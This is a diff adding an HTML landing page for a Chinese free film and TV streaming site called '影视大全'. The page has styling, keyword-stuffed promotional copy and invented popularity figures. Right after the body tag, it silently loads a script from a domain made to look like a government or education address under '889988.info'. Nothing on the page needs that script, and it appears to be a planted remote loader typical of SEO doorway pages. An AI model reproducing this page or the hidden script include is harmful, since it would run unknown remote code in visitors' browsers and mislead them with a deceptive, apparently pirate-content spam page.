@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>影视大全 - 免费高清影视在线观看_最新电影电视剧综艺动漫</title>
+<meta name="description" content="影视大全(yingshidaquan-zh.github.io)聚合全网高清影视资源,提供最新电影、热播电视剧、综艺节目、动漫番剧免费在线观看,每日更新,多线路极速播放,尽在影视大全。">
+<meta name="keywords" content="影视大全,yingshidaquan-zh.github.io,免费电影在线观看,最新电视剧,综艺节目,动漫番剧,高清影视资源">
+<meta name="author" content="影视大全">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://yingshidaquan-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--purple:#7c3aed;--purple-light:#a78bfa;--pink:#ec4899;--dark:#0c0613;--card:#16102a;--text:#e8e4f0;--muted:#8b82a8;--gold:#fbbf24;--radius:18px}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",-apple-system,sans-serif;background:var(--dark);color:var(--text);line-height:1.75;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+.container{max-width:1180px;margin:0 auto;padding:0 24px}
+
+/* top bar */
+.topbar{position:fixed;top:0;left:0;width:100%;z-index:999;background:rgba(12,6,19,.88);backdrop-filter:blur(16px);border-bottom:1px solid rgba(124,58,237,.18)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-size:22px;font-weight:800;background:linear-gradient(90deg,var(--purple-light),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent;letter-spacing:.5px}
+.brand b{color:var(--gold);-webkit-text-fill-color:var(--gold);font-style:normal}
+.menu{display:flex;gap:28px}
+.menu a{font-size:14px;color:var(--muted);font-weight:500;position:relative;padding:6px 0}
+.menu a:hover{color:#fff}
+.menu a:hover::before{content:"";position:absolute;left:0;bottom:0;width:100%;height:2px;background:linear-gradient(90deg,var(--purple),var(--pink));border-radius:2px}
+.burger{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.burger s{width:22px;height:2px;background:var(--purple-light);border-radius:2px;text-decoration:none}
+
+/* banner */
+.banner{margin-top:64px;padding:90px 0 70px;position:relative;overflow:hidden;background:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(124,58,237,.28),transparent),radial-gradient(ellipse 50% 50% at 80% 50%,rgba(236,72,153,.1),transparent)}
+.banner .container{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:50px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:12px;color:var(--purple-light);background:rgba(124,58,237,.12);border:1px solid rgba(124,58,237,.3);padding:6px 16px;border-radius:40px;margin-bottom:22px;font-weight:600}
+.banner h1{font-size:clamp(30px,5.5vw,56px);line-height:1.18;font-weight:900;letter-spacing:-.5px}
+.banner h1 i{font-style:normal;background:linear-gradient(90deg,var(--purple-light),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.banner .lead{margin:20px 0 30px;color:var(--muted);font-size:16px;max-width:520px}
+.cta-group{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:13px 32px;border-radius:12px;font-size:15px;font-weight:700;display:inline-flex;align-items:center;gap:8px;border:0;cursor:pointer;transition:.28s}
+.btn-main{background:linear-gradient(135deg,var(--purple),var(--pink));color:#fff;box-shadow:0 10px 30px rgba(124,58,237,.38)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 16px 40px rgba(124,58,237,.5)}
+.btn-ghost{background:rgba(255,255,255,.05);color:var(--text);border:1px solid rgba(255,255,255,.14)}
+.btn-ghost:hover{border-color:var(--purple-light);background:rgba(124,58,237,.1)}
+
+/* floating card */
+.float-card{background:linear-gradient(160deg,rgba(22,16,42,.95),rgba(30,20,60,.8));border:1px solid rgba(124,58,237,.22);border-radius:24px;padding:32px;box-shadow:0 30px 70px rgba(0,0,0,.5);position:relative}
+.float-card .url-bar{background:rgba(0,0,0,.35);border-radius:10px;padding:12px 16px;font-size:13px;color:var(--purple-light);font-family:monospace;margin-bottom:22px;word-break:break-all}
+.float-card .url-bar span{color:var(--muted)}
+.float-card h3{font-size:20px;margin-bottom:18px}
+.mini-list{display:flex;flex-direction:column;gap:12px}
+.mini-row{display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:10px;background:rgba(255,255,255,.03)}
+.mini-row .dot{width:36px;height:36px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.mini-row .txt{font-size:13px;line-height:1.4}
+.mini-row .txt small{display:block;color:var(--muted);font-size:11px}
+
+/* section */
+section{padding:88px 0}
+.sec-head{margin-bottom:44px}
+.sec-head .kicker{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--purple-light);font-weight:700}
+.sec-head h2{font-size:clamp(24px,4vw,38px);font-weight:800;margin-top:8px}
+.sec-head p{color:var(--muted);margin-top:10px;font-size:15px;max-width:560px}
+
+/* channel */
+.ch-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:22px}
+.ch-box{background:var(--card);border:1px solid rgba(255,255,255,.06);border-radius:var(--radius);padding:28px 24px;transition:.35s;position:relative;overflow:hidden}
+.ch-box::before{content:"";position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,var(--purple),var(--pink));transform:scaleX(0);transform-origin:left;transition:.4s}
+.ch-box:hover{transform:translateY(-5px);border-color:rgba(124,58,237,.3);box-shadow:0 18px 45px rgba(0,0,0,.4)}
+.ch-box:hover::before{transform:scaleX(1)}
+.ch-ico{font-size:38px;margin-bottom:14px}
+.ch-box h3{font-size:18px;margin-bottom:8px}
+.ch-box p{font-size:13px;color:var(--muted)}
+.ch-box .chips{margin-top:14px;display:flex;gap:6px;flex-wrap:wrap}
+.chip{font-size:11px;padding:3px 10px;border-radius:20px;background:rgba(124,58,237,.14);color:var(--purple-light)}
+
+/* top list */
+.top-wrap{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:20px}
+.top-item{background:var(--card);border-radius:14px;overflow:hidden;transition:.3s;border:1px solid transparent}
+.top-item:hover{border-color:rgba(251,191,36,.3);transform:scale(1.025)}
+.top-cover{height:220px;display:flex;align-items:center;justify-content:center;font-size:52px;position:relative}
+.top-no{position:absolute;top:12px;left:12px;background:linear-gradient(135deg,var(--purple),var(--pink));color:#fff;font-weight:800;font-size:13px;width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center}
+.top-item .info{padding:14px 16px}
+.top-item .info h4{font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.top-item .info .line{display:flex;justify-content:space-between;margin-top:6px;font-size:12px;color:var(--muted)}
+.top-item .info .line b{color:var(--gold)}
+
+/* advantage */
+.adv-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:24px}
+.adv-card{background:linear-gradient(155deg,var(--card),rgba(22,16,42,.4));border:1px solid rgba(255,255,255,.05);border-radius:var(--radius);padding:30px 26px;transition:.35s}
+.adv-card:hover{background:linear-gradient(155deg,rgba(124,58,237,.1),var(--card));border-color:rgba(124,58,237,.25)}
+.adv-num{font-size:13px;color:var(--pink);font-weight:800;letter-spacing:1px}
+.adv-card h3{font-size:19px;margin:10px 0}
+.adv-card p{font-size:14px;color:var(--muted)}
+
+/* about */
+.about-block{background:radial-gradient(ellipse at 20% 50%,rgba(236,72,153,.08),transparent),var(--card);border:1px solid rgba(255,255,255,.06);border-radius:28px;padding:50px;display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.about-block h2{font-size:clamp(24px,3.5vw,34px);font-weight:800;margin-bottom:18px}
+.about-block p{color:var(--muted);font-size:14.5px;margin-bottom:12px}
+.about-block strong{color:#fff}
+.about-block .site-url{display:inline-block;margin:14px 0;background:rgba(0,0,0,.3);border:1px solid rgba(124,58,237,.3);border-radius:10px;padding:10px 18px;font-family:monospace;font-size:14px;color:var(--purple-light)}
+.metrics{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.metric{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:22px;text-align:center}
+.metric .v{font-size:28px;font-weight:900;color:var(--purple-light)}
+.metric .l{font-size:12px;color:var(--muted);margin-top:4px}
+
+/* footer */
+footer{background:#080410;border-top:1px solid rgba(255,255,255,.05);padding:56px 0 26px}
+.foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:36px}
+.foot-col h4{font-size:15px;margin-bottom:14px}
+.foot-col p{color:var(--muted);font-size:13px}
+.foot-col ul li{margin-bottom:9px}
+.foot-col ul li a{color:var(--muted);font-size:13px}
+.foot-col ul li a:hover{color:var(--purple-light)}
+.copyright{text-align:center;border-top:1px solid rgba(255,255,255,.06);padding-top:22px;font-size:12px;color:var(--muted)}
+.copyright a{color:var(--purple-light)}
+
+/* anim */
+.rv{opacity:0;transform:translateY(28px);transition:.65s cubic-bezier(.22,.61,.36,1)}
+.rv.on{opacity:1;transform:none}
+
+@media(max-width:860px){
+  .burger{display:flex}
+  .menu{position:fixed;top:64px;left:0;width:100%;flex-direction:column;background:rgba(12,6,19,.97);padding:20px 24px;gap:0;border-bottom:1px solid rgba(124,58,237,.15);transform:translateY(-120%);transition:.4s}
+  .menu.open{transform:none}
+  .menu a{padding:14px 0;border-bottom:1px solid rgba(255,255,255,.05)}
+  .banner .container{grid-template-columns:1fr}
+  .float-card{order:-1}
+  .about-block{grid-template-columns:1fr;padding:32px 24px}
+  section{padding:64px 0}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:26px}
+}
+@media(max-width:500px){
+  .foot-grid{grid-template-columns:1fr}
+  .metrics{grid-template-columns:1fr 1fr}
+  .btn{padding:12px 24px;font-size:14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap container">
+    <a href="#" class="brand">影视<b>大全</b></a>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#channel">内容频道</a>
+      <a href="#toplist">热播榜单</a>
+      <a href="#advantage">核心优势</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="burger" id="burger"><s></s><s></s><s></s></div>
+  </div>
+</div>
+
+<section class="banner" id="home">
+  <div class="container">
+    <div>
+      <span class="eyebrow">✦ 官方站点 yingshidaquan-zh.github.io</span>
+      <h1>一站聚合 <i>全网影视</i><br>免费高清随心看</h1>
+      <p class="lead">影视大全专注整合电影、电视剧、综艺、动漫等海量正版影视内容,每日实时更新,多线路秒开播放,让你随时随地享受影院级视听体验。</p>
+      <div class="cta-group">
+        <a href="#channel" class="btn btn-main">▶ 开始观影</a>
+        <a href="#advantage" class="btn btn-ghost">了解平台优势</a>
+      </div>
+    </div>
+    <div class="float-card">
+      <div class="url-bar"><span>官网地址 →</span> https://yingshidaquan-zh.github.io</div>
+      <h3>📊 平台实时数据</h3>
+      <div class="mini-list">
+        <div class="mini-row"><div class="dot" style="background:rgba(124,58,237,.18)">🎬</div><div class="txt">在线影视资源<small>累计收录 12 万+ 部</small></div></div>
+        <div class="mini-row"><div class="dot" style="background:rgba(236,72,153,.18)">📺</div><div class="txt">每日新增内容<small>实时同步更新</small></div></div>
+        <div class="mini-row"><div class="dot" style="background:rgba(251,191,36,.15)">⚡</div><div class="txt">播放响应速度<small>平均 &lt; 0.8 秒</small></div></div>
+        <div class="mini-row"><div class="dot" style="background:rgba(52,211,153,.15)">👥</div><div class="txt">活跃观影用户<small>日均 50 万+</small></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="channel">
+  <div class="container">
+    <div class="sec-head rv">
+      <div class="kicker">Content Channels</div>
+      <h2>覆盖全品类的影视内容频道</h2>
+      <p>影视大全按类型精细划分内容频道,帮你快速定位想看的每一部好片。</p>
+    </div>
+    <div class="ch-grid">
+      <div class="ch-box rv">
+        <div class="ch-ico">🎬</div>
+        <h3>电影频道</h3>
+        <p>院线大片、经典老片、独立电影、纪录片,动作、喜剧、科幻、悬疑全类型覆盖,支持 4K 超清。</p>
+        <div class="chips"><span class="chip">动作</span><span class="chip">科幻</span><span class="chip">喜剧</span><span class="chip">悬疑</span></div>
+      </div>
+      <div class="ch-box rv">
+        <div class="ch-ico">📺</div>
+        <h3>电视剧频道</h3>
+        <p>国产剧、美剧、韩剧、日剧、泰剧实时追更,热门剧集第一时间上线,高清流畅不卡顿。</p>
+        <div class="chips"><span class="chip">国产</span><span class="chip">美剧</span><span class="chip">韩剧</span><span class="chip">日剧</span></div>
+      </div>
+      <div class="ch-box rv">
+        <div class="ch-ico">🎤</div>
+        <h3>综艺频道</h3>
+        <p>真人秀、脱口秀、选秀、访谈、晚会,国内外热门综艺一网打尽,欢笑不间断。</p>
+        <div class="chips"><span class="chip">真人秀</span><span class="chip">脱口秀</span><span class="chip">选秀</span><span class="chip">访谈</span></div>
+      </div>
+      <div class="ch-box rv">
+        <div class="ch-ico">🐉</div>
+        <h3>动漫频道</h3>
+        <p>国漫、日漫、美漫全收录,TV 动画、剧场版、OVA 应有尽有,追番必备。</p>
+        <div class="chips"><span class="chip">国漫</span><span class="chip">日漫</span><span class="chip">剧场版</span><span class="chip">热血</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="toplist" style="background:linear-gradient(180deg,transparent,rgba(124,58,237,.04))">
+  <div class="container">
+    <div class="sec-head rv">
+      <div class="kicker">Hot Charts</div>
+      <h2>🔥 实时热播影视榜单</h2>
+      <p>基于全站用户观影行为数据生成,反映当下最热门的影视内容趋势。</p>
+    </div>
+    <div class="top-wrap">
+      <div class="top-item rv"><div class="top-cover" style="background:linear-gradient(150deg,#1e1040,#120830)">🏆<span class="top-no">1</span></div><div class="info"><h4>深渊追击 2024</h4><div class="line"><span>动作/犯罪</span><b>🔥 96.8万</b></div></div></div>
+      <div class="top-item rv"><div class="top-cover" style="background:linear-gradient(150deg,#2a1040,#180830)">🎞️<span class="top-no">2</span></div><div class="info"><h4>沉默的真相 第二季</h4><div class="line"><span>悬疑/剧情</span><b>🔥 89.3万</b></div></div></div>
+      <div class="top-item rv"><div class="top-cover" style="background:linear-gradient(150deg,#401020,#200810)">🎭<span class="top-no">3</span></div><div class="info"><h4>欢乐集结号</h4><div class="line"><span>综艺/真人秀</span><b>🔥 82.1万</b></div></div></div>
+      <div class="top-item rv"><div class="top-cover" style="background:linear-gradient(150deg,#104030,#082018)">🐲<span class="top-no">4</span></div><div class="info"><h4>凡人修仙传·年番</h4><div class="line"><span>动漫/玄幻</span><b>🔥 78.6万</b></div></div></div>
+      <div class="top-item rv"><div class="top-cover" style="background:linear-gradient(150deg,#303010,#181808)">💥<span class="top-no">5</span></div><div class="info"><h4>极速狂飙 11</h4><div class="line"><span>动作/飙车</span><b>🔥 71.4万</b></div></div></div>
+      <div class="top-item rv"><div class="top-cover" style="background:linear-gradient(150deg,#201040,#100820)">💕<span class="top-no">6</span></div><div class="info"><h4>余生有你</h4><div class="line"><span>爱情/都市</span><b>🔥 66.7万</b></div></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="advantage">
+  <div class="container">
+    <div class="sec-head rv">
+      <div class="kicker">Why YSDQ</div>
+      <h2>影视大全的六大核心优势</h2>
+      <p>从播放体验到内容覆盖,影视大全(yingshidaquan-zh.github.io)始终以用户需求为核心。</p>
+    </div>
+    <div class="adv-grid">
+      <div class="adv-card rv"><div class="adv-num">01</div><h3>⚡ 极速秒播</h3><p>全球 CDN 节点加速,视频秒开无需等待,告别缓冲转圈,观影全程流畅。</p></div>
+      <div class="adv-card rv"><div class="adv-num">02</div><h3>📱 全端适配</h3><p>PC、手机、平板完美适配,浏览器打开即用,无需下载安装任何客户端。</p></div>
+      <div class="adv-card rv"><div class="adv-num">03</div><h3>🎯 智能推荐</h3><p>机器学习算法分析观影喜好,个性化推荐好片,越用越懂你。</p></div>
+      <div class="adv-card rv"><div class="adv-num">04</div><h3>🔀 多线切换</h3><p>每部影视提供多个播放源,主线路卡顿一键切换,观影不中断。</p></div>
+      <div class="adv-card rv"><div class="adv-num">05</div><h3>🛡️ 纯净安全</h3><p>全站 HTTPS 加密,无弹窗广告、无诱导下载,绿色安全的观影环境。</p></div>
+      <div class="adv-card rv"><div class="adv-num">06</div><h3>🌙 护眼模式</h3><p>内置深色主题与亮度调节,长时间追剧不疲劳,夜间观影更舒适。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="about" style="background:linear-gradient(180deg,rgba(124,58,237,.04),transparent)">
+  <div class="container">
+    <div class="about-block rv">
+      <div>
+        <div class="kicker">About Us</div>
+        <h2>关于 影视大全</h2>
+        <p><strong>影视大全</strong>是一个专注于影视内容聚合与在线观看服务的平台,致力于为观众提供一站式、高质量的观影入口。</p>
+        <p>平台汇集电影、电视剧、综艺、动漫等全品类内容,从好莱坞大片到小众文艺片,从热门国产剧到经典老番,力求满足不同观众的多样化需求。</p>
+        <p>我们坚持<strong>内容为王、体验至上</strong>,持续优化播放技术与界面交互,让每一次观影都成为享受。</p>
+        <div class="site-url">🌐 https://yingshidaquan-zh.github.io</div>
+        <p>访问影视大全官网,开启你的专属观影之旅。</p>
+      </div>
+      <div class="metrics">
+        <div class="metric"><div class="v">12万+</div><div class="l">影视资源</div></div>
+        <div class="metric"><div class="v">99.9%</div><div class="l">服务可用</div></div>
+        <div class="metric"><div class="v">4K</div><div class="l">最高画质</div></div>
+        <div class="metric"><div class="v">50万+</div><div class="l">日活用户</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-col">
+        <h4>🎬 影视大全</h4>
+        <p>影视大全(yingshidaquan-zh.github.io)——您身边的影视娱乐导航,聚合全网优质影视资源,提供高清流畅的在线观影体验。</p>
+      </div>
+      <div class="foot-col">
+        <h4>快速导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#channel">内容频道</a></li><li><a href="#toplist">热播榜单</a></li><li><a href="#advantage">核心优势</a></li></ul>
+      </div>
+      <div class="foot-col">
+        <h4>内容分类</h4>
+        <ul><li><a href="#channel">电影频道</a></li><li><a href="#channel">电视剧频道</a></li><li><a href="#channel">综艺频道</a></li><li><a href="#channel">动漫频道</a></li></ul>
+      </div>
+      <div class="foot-col">
+        <h4>联系我们</h4>
+        <ul><li><a href="#">📧 意见反馈</a></li><li><a href="#">💬 用户社区</a></li><li><a href="#">📱 移动端入口</a></li></ul>
+      </div>
+    </div>
+    <div class="copyright">
+      <p>© 2024 影视大全 | 官网：<a href="https://yingshidaquan-zh.github.io">https://yingshidaquan-zh.github.io</a> | 保留所有权利</p>
+      <p style="margin-top:8px;color:#4a4260">本站仅提供影视信息导航服务,资源版权归原作者所有</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),menu=document.getElementById('menu');
+burger.addEventListener('click',function(){menu.classList.toggle('open');});
+menu.addEventListener('click',function(e){if(e.target.tagName==='A')menu.classList.remove('open');});
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('on');io.unobserve(e.target);}});},{threshold:.1,rootMargin:'0px 0px -30px'});
+document.querySelectorAll('.rv').forEach(function(el){io.observe(el);});
+</script>
+</body>
+</html>
